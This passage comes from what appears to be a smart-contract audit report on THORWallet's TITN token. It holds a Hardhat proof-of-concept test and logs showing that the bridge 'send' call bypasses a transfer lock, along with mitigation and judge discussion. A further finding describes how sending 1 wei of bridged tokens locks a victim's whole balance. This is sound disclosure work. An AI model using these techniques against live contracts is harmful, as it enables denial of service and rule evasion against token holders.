class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;before user2 balance: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;after user2 balance: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e())\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eLogs\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"console\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ebefore user2 balance:  BigNumber { value: \u0026quot;0\u0026quot; }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eafter user2 balance:  BigNumber { value: \u0026quot;1000000000000000000\u0026quot; }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ✔ user1  transfer TITN tokens to user2 by bridge when transfer disable\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to also disable the \u003ccode\u003esend\u003c/code\u003e function when \u003ccode\u003eisBridgedTokensTransferLocked\u003c/code\u003e is set to true. Alternatively, add the \u003ccode\u003e_validateTransfer\u003c/code\u003e check to the \u003ccode\u003emint\u003c/code\u003e/\u003ccode\u003eburn\u003c/code\u003e functions.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ecacaomatt (THORWallet) confirmed\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eValid finding, medium severity as of now, given although the invariant is broken, afiak, no direct fund loss or exploit is possible.\u003c/p\u003e\n\u003cp\u003eThere is a case of speculative trading to price the tokens that directly go against another invariant. Would take any comments that makes a case for high severity regarding this impact.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBridged TITN Tokens: Transfers are restricted to a pre-defined address (transferAllowedContract), set by the admin. Initially, this address will be the staking contract to prevent trading until the \u003ccode\u003eisBridgedTokensTransferLocked flag\u003c/code\u003e is disabled by the admin.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\u0026#x26;commentChild=kvGZUdiBJnb\"\u003ecryptoxz (THORWallet) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eOne of the main points to add this restriction was to prevent users to create a trading pool before TGE. We would like to explore more this issue as that would be a high concern for us.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\u0026#x26;commentChild=EUqvh6hKDrp\"\u003ecacaomatt (THORWallet) confirmed and commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWe’ve created a PR for this \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\u0026#x26;commentChild=m5ogg9Phf9Y\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eRaising to high severity, as of now, given the possible impact of speculative trading I mentioned above\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-03-thorwallet-mitigation?tab=readme-ov-file#findings-being-mitigated\"\u003eTHORWallet mitigated\u003c/a\u003e:\u003c/strong\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe PR \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/tree/audit-4\"\u003ehere\u003c/a\u003e only allows bridging to the sender’s own address.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-4\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-9\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-13\"\u003ekn0t\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"medium-risk-findings-1\" style=\"position:relative;\"\u003e\u003ca href=\"#medium-risk-findings-1\" aria-label=\"medium risk findings 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMedium Risk Findings (1)\u003c/h1\u003e\n\u003ch2 id=\"m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector\" style=\"position:relative;\"\u003e\u003ca href=\"#m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector\" aria-label=\"m 1 improper transfer restrictions on non bridged tokens due to boolean bridged token tracking allowing a dos attack vector permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7\"\u003e[M-1] Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-125\"\u003eLimbooo\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-680\"\u003e0xAadi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-40\"\u003e0xAsen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-51\"\u003e0xAsen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-128\"\u003e0xastronatey\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-559\"\u003e0xcrazyboy999\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-759\"\u003e0xdoichantran\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-577\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-416\"\u003e0xIconart\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-756\"\u003e0xlemon\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-132\"\u003e0xloscar01\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-691\"\u003e0xMosh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-578\"\u003e0xTonraq\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-612\"\u003e0xvd\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-611\"\u003e0xyuri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-231\"\u003e4B\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-194\"\u003eAbdessamed\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-438\"\u003eAbdul\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-531\"\u003eagadzhalov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-499\"\u003eAgorist\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-98\"\u003ealdarion\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-412\"\u003eAlekso\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-33\"\u003eArjuna\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-67\"\u003earnie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-53\"\u003eattentioniayn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-476\"\u003ebani\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-145\"\u003eBenterkiii\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-370\"\u003eBz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-46\"\u003eclassic-k\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-767\"\u003eDaniel_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-127\"\u003eDaniel526\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-751\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-650\"\u003edoublekk\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-651\"\u003eeLSeR17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-735\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-749\"\u003efalconhoof\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-79\"\u003efarismaulana\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-260\"\u003efelconsec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-788\"\u003efrancoHacker\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-381\"\u003egesha17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-335\"\u003eginlee\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-716\"\u003eHappyTop0603\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-238\"\u003ehearmen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-239\"\u003ehearmen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-633\"\u003eHeavyweight_hunters\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-580\"\u003ehyuunn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-637\"\u003ehyuunn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-623\"\u003eiam_emptyset\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-368\"\u003eiamandreiski\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-227\"\u003eIlloy-Scizceneghposter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-524\"\u003einh3l\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-646\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-387\"\u003ejesjupyter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-168\"\u003ejsonDoge\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-257\"\u003eka14ar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-346\"\u003ekn0t\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-502\"\u003eKupiaSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-229\"\u003elanyi2023\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-474\"\u003elaxraw\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-385\"\u003eleegh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-414\"\u003ematrix_0wl\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-243\"\u003emisbahu\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-8\"\u003emontecristo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-378\"\u003eMSK\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-808\"\u003eMylifechangefast_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-525\"\u003eMysteryAuditor\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-647\"\u003eNHristov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-521\"\u003ePabloPerez\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-119\"\u003epairingfriendly\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-264\"\u003epatitonar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-655\"\u003epeanuts\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-460\"\u003ephoenixV110\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-538\"\u003eREKCAH\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-91\"\u003eSabit\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-398\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-487\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-408\"\u003eSherlock__VARM\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-557\"\u003eShipkata494\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-151\"\u003esilver_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-164\"\u003eSpicyMeatball\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-506\"\u003etheboiledcorn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-511\"\u003etheboiledcorn\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-52\"\u003eundefined_joe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-425\"\u003evladi319\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-115\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-673\"\u003eX0sauce\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-357\"\u003ey4y\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-305\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-172\"\u003eZach_166\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-626\"\u003ezzykxx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L106-L108\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L82-L83\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-2\" aria-label=\"finding description and impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e \u003cstrong\u003eRoot Cause\u003c/strong\u003e\nThe \u003ccode\u003eTitn.sol\u003c/code\u003e contract incorrectly tracks bridged token holders using a boolean flag (\u003ccode\u003eisBridgedTokenHolder\u003c/code\u003e). Once an address receives \u003cem\u003eany\u003c/em\u003e bridged tokens (via cross-chain bridging), it is permanently marked as a “bridged token holder,” subjecting \u003cstrong\u003eall\u003c/strong\u003e tokens held by that address (including non-bridged ones) to transfer restrictions. This flawed design allows malicious actors to disrupt legitimate users by sending them a trivial amount of bridged tokens, thereby locking their entire TITN balance from being transferred freely.\u003c/p\u003e\n\u003cp\u003e \u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLoss of User Control\u003c/strong\u003e: Users holding both bridged and non-bridged tokens cannot transfer \u003cem\u003eany\u003c/em\u003e tokens unless sending them to the LayerZero endpoint or \u003ccode\u003etransferAllowedContract\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDenial-of-Service (DoS) Attack Vector\u003c/strong\u003e: An attacker can send 1 wei of bridged TITN to any address, permanently locking their TITN tokens (even those obtained through non-bridged means).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProtocol Functionality Breakdown\u003c/strong\u003e: The intended economic model (allowing free transfer of non-bridged tokens) is violated, undermining user trust and utility.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 